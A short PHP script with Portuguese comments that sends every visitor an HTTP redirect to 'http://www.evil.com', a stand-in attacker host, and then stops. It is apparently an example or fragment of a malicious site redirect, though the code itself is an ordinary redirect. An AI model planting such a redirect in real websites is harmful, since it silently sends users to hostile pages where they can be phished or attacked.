<?php
// Redireciona para o site desejado
$novoSite = "http://www.evil.com";
header("Location: $novoSite");
exit; // Certifique-se de encerrar o script após o redirecionamento
?>
